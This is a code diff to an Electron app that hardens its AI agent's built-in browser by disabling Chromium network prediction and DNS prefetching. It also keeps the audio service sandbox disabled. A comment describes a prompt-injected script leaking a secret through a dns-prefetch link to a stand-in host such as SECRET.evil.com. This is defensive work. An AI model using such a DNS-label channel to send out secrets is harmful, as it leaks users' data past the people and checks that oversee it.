@@ -56,13 +56,30 @@ const _earlyPort = (() => {
 app.commandLine.appendSwitch("unsafely-treat-insecure-origin-as-secure", `http://127.0.0.1:${_earlyPort}`);
 app.commandLine.appendSwitch("enable-features", "WebRTCPipeWireCapturer");
 app.commandLine.appendSwitch("enable-media-stream");
-// The sandboxed audio service can't load third-party virtual audio drivers
-// (Steam Streaming Microphone, VB-Cable, OBS, NVIDIA Broadcast, …), so
-// getUserMedia silently captured nothing from them in the desktop app even
-// though the same device works in a normal browser. Disabling the audio
-// sandbox lets the audio process reach those devices. Out-of-process audio
-// stays on (only the sandbox is dropped), so the blast radius is small.
-app.commandLine.appendSwitch("disable-features", "AudioServiceSandbox");
+// Consolidated --disable-features. Chromium honors only the LAST
+// appendSwitch("disable-features", …), so every feature-disable MUST live in
+// this single call or it silently clobbers the others.
+//   • AudioServiceSandbox — the sandboxed audio service can't load third-party
+//     virtual audio drivers (Steam Streaming Microphone, VB-Cable, OBS, NVIDIA
+//     Broadcast, …), so getUserMedia silently captured nothing from them in the
+//     desktop app even though the same device works in a normal browser.
+//     Disabling the audio sandbox lets the audio process reach those devices.
+//     Out-of-process audio stays on (only the sandbox is dropped), so the blast
+//     radius is small.
+//   • NetworkPrediction — closes a DNS-label exfil channel: a prompt-injected
+//     script can leak a secret via a `<link rel=dns-prefetch|preconnect
+//     href=https://SECRET.evil.com>` hint (DNS query, no HTTP request, no fetch),
+//     which CSP can't gate and no evaluate regex reliably catches. Disabling the
+//     network-prediction service makes those hints inert. app.commandLine is
+//     app-global, but every WebContentsView in this app is the agent's co-driven
+//     browser — the user's real personal browsing happens in a separate Chrome/
+//     Safari install this app can't touch — so this only hardens the agent
+//     browser and is in scope. Paired with dns-prefetch-disable below.
+app.commandLine.appendSwitch("disable-features", "AudioServiceSandbox,NetworkPrediction");
+// Standalone switch (no conflict with disable-features): kills DNS prefetching
+// so the dns-prefetch/preconnect DNS-label exfil hint is inert at the network
+// layer, matching the CDP/Playwright agent-Chrome backend in src/browser/launcher.ts.
+app.commandLine.appendSwitch("dns-prefetch-disable");
 // permission-request handler in app.ready controls media grants explicitly.
 initBrowserNetworkHardening(); // QUIC/DoH off (app-wide, pre-ready) for browser-view partitions
 
